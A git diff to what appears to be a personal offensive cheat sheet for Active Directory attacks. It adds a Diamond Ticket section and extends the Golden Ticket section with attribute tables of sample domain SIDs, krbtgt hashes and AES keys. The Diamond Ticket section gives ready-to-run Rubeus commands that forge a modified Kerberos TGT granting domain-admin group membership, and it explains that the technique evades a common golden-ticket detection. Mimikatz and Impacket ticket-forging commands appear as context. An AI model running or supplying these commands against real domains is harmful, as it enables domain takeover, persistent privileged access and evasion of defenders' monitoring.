@@ -50,6 +50,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 		* [DCSync](#dcsync)
 * **[Persistence](#persistence)**
 	* [Golden Ticket](#golden-ticket)
+	* [Diamond Ticket](#diamond-ticket)
 	* Skeleton Keys
 	* Shortcuts
 	* [msDS-AllowedToDelegateTo](#msds-allowedtodelegateto)
@@ -504,12 +505,38 @@ lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc0
 
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
+| Attribute   | Value                                  |
+| ---         | -----------                            |
+| Domain      | legitcorp.local                        |
+| Domain SID  | S-1-5-21-1935943001-39345449-285568504 |
+| krbtgt hash | 7e8612a348a729bcb2f597a9cbc27c12       |
+| Username    | trex                                   |
 ```
 # Mimikatz
 kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt
 
 # Impacket
 ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -dc-ip 192.179.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
+```
+
+### Diamond Ticket
+A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) because golden ticket wouldn't require TGT request since it can be forged offline. Diamond ticket is where we can request a valid user's TGT regardless the level of access on the domain, then the ticket will be modified to allow us to request TGS for a specific service. This is a better technique because normally golden ticket is easier to detect by monitoring for service ticket requests (TGS-REQs) that have no correspokding TGT request (AS-REQ). Detailed steps are as follows:-
+| Attribute           | Value                                                            |
+| ---                 | -----------                                                      |
+| Username & Password | loki:Password123                                                 |
+| Domain              | range.net                                                        |
+| krbtgt AES-256 Key  | 8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee |
+| User in PAC         | rangeadm                                                         |
+1. Request a diamond key with [Rubeus](https://github.com/GhostPack/Rubeus). It does the following steps:-
+	i. Request normal user TGT
+	ii. Decrypt the TGT with krbtgt aes key
+	iii. Modify ticket PAC and insert _rangeadm_ in the PAC
+```
+Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
+```
+2. To very the Diamond ticket (modified TGT), requst a service ticket (TGS)
+```
+.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
 ```
 
 ### msDS-AllowedToDelegateTo
